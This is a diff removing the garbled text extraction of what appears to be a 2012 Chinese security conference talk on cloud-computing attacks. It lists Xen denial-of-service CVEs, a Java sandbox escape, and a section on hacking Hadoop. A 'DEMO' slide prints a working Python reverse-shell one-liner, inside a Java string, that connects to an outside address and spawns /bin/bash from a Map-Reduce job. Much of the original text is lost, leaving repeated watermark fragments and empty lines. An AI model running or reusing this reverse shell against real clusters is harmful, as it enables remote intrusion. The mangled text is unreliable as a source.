@@ -1,163 +1,0 @@
-A-PDF Watermark DEMO: Purchase from www.A-PDF.com to remove the watermark
-
-
-SSAACCCC22001122
-
- 2012-07
-
-Who am I?
-· Alibaba security (7 years)
-(31w)
-
-icloud
-SSAACCCC22001122
-
-
-
-SSAACCCC22001122
-
- 
-
-
-
- Utility Computing
-
-SSAACCCC22001122
-
-
-
-Computing as Utility
-SSAACCCC22001122
-
-
-
-
-
-
-
-
-
-
-
-SSAACCCC22001122
-
-
-
-
-
-
-""" "
-""""
-SSAACCCC22001122
-
-Security as a Service
-
-
-SSAACCCC22001122
-
-
- 
-
-
-
-· 
-
-·  (CVE-2011-1898)
-
-· D.O.S.
-
-Guest OS
-
-Guest OS
-
-Host xx
-
-Domain 0
-
-SSAACCCC22001122
-
-... Domain U
-Hypervisor Hardware
-
-Domain U
-
-XENDOS
-· CVE-2012-2625 XEN 4.x · CVE-2010-4255 XEN 4.0.1 · CVE-2010-4247 XEN 3.4.0 · CVE-2010-3699 XEN 3.x
-
-AppEngine
-
-· Java sandbox · PHP sandbox
-SSAACCCC22001122
-
- 
-
-CVE-2012-0507
-· Attacking java security manager
-
-SSAACCCC22001122
-
-java sandbox
-
-
-API ARP srcip DDOS
-SSAACCCC22001122
-
-
-hadoop
-
-Map-Reduce
-SSAACCCC22001122
-
-
- 
-
-hadoop
-· Hadoop linux · "gateway"
-SSAACCCC22001122
-
-"gateway"
-/home:
-
-Hacking Hadoop
-
- 
-
-
-
-SSAACCCC22001122
-
- 
-
-Map-Reduce job/UDF
-· java code · sandbox
-
-SSAACCCC22001122
-
-DEMO
-String pysh = "#!/bin/sh\r\npython -c \"import os;import sys;import socket;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((socket.gethostbyna me('10.x.x.x'),9999));s.send('Welcome my master\\r\\n');os.dup2(s.fileno(), 0);os.dup2(s.fileno(), 1);os.dup2(s.fileno(), 2);s.send('Is there a shell?\\r\\n');os.system('/bin/bash');s.close();s.send('See u next time!\\r\\n');\"";
-
-SSAACCCC22001122
-
-
-  13307491234    13466655678 
-
-Data Masking
-SSAACCCC22001122
-
-
-A  1330749xxxx C  1346665yyyy
-ABCD 43010419990909MMM1 EFGH 42010519880808NNN4
-
-
-  
-SSAACCCC22001122
-
-Question? 
-· 
-­ http://weibo.com/n/aullik5 ­ http://t.qq.com/aullik5
-· 
-­ http://hi.baidu.com/new/aullik5
-
-SSAACCCC22001122
-
-
